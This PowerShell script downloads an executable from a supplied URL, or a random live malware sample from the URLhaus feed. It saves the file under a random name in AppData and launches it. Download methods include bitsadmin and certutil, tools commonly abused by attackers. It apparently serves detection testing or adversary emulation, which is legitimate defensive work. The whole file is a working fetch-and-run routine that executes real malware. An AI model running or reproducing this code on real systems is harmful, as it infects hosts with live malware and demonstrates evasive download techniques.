param (
  [string] $url,
  [switch] $random,
  [string] $method
)

function Display-Parameters {
  Write-Host "-url <source URL>    Download file from a given URL."
  Write-Host "-random              Download a random file from the URLhaus feed."
  Write-Host "-method (optional)   Download method: bits, certutil, webclient (default) or webrequest."
}

if (!$url -and !$random) {
  Write-Host "Please specify a mode of operation."
  Display-Parameters
  exit 1
}

if ($url -and $random) {
  Write-Host "You must specify only one mode of operation."
  Display-Parameters
  exit 1
}

if (!$method) {
  $method = "webclient"
}

elseif ($method -inotin ("bits", "certutil", "webclient", "webrequest")) {
  Write-Host "Invalid download method defined."
  Display-Parameters
  exit 1
}

if ($random) {
  Write-Host "Retrieving online URLs from URLhaus..."
  $request = Invoke-WebRequest -Uri "https://urlhaus.abuse.ch/downloads/csv_online/"

  if ($request.StatusCode -ne 200) {
    Write-Host "Failed to query URLhaus."
    exit 1
  }

  Write-Host "Parsing CSV and selecting random URL..."
  $csv = $request.Content | ConvertFrom-Csv -Delimiter "," -Header "id", "dateadded", "url", "url_status", "threat", "tags", "urlhaus_link", "reporter"
  $online_exe = $csv.Where{$_.tags -contains "exe"}
  $random_exe = Get-Random -InputObject $online_exe
  $url = $random_exe.url
}

Write-Host "Source URL defined as: $url"

$random_str = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$outfile = "$env:APPDATA\$random_str.exe"

if ($method -ieq "bits"){
  Write-Host "Downloading file via BITSAdmin..."
  $cmd = "$($env:SystemRoot)\system32\bitsadmin.exe /transfer $random_str /download /priority normal $url $outfile"
  Invoke-Expression $cmd
}

elseif ($method -ieq "certutil") {
  Write-Host "Downloading file via certutil..."
  $cmd = "$($env:SystemRoot)\system32\certutil.exe -urlcache -split -f $url $outfile"
  Invoke-Expression $cmd
}

elseif ($method -ieq "webrequest") {
  Write-Host "Downloading file via Invoke-WebRequest..."
  Invoke-WebRequest -Uri $url -OutFile $outfile
}

else {
  Write-Host "Downloading file via WebClient..."
  (New-Object System.Net.WebClient).DownloadFile($url, $outfile)
}

if ((Test-Path $outfile) -eq $false) {
  Write-Host "File did not successfully save."
  exit 1
}

Write-Host "Successfully saved as: $outfile"
Write-Host "Starting process..."
$process = Start-Process $outfile -PassThru
$process_id = $process.Id

if (!$process_id -or (Get-Process -Id $process_id -ErrorAction SilentlyContinue) -eq $null) {
  Write-Host "Failed to start process."
  exit 1
}

Write-Host "Process started with PID: $process_id"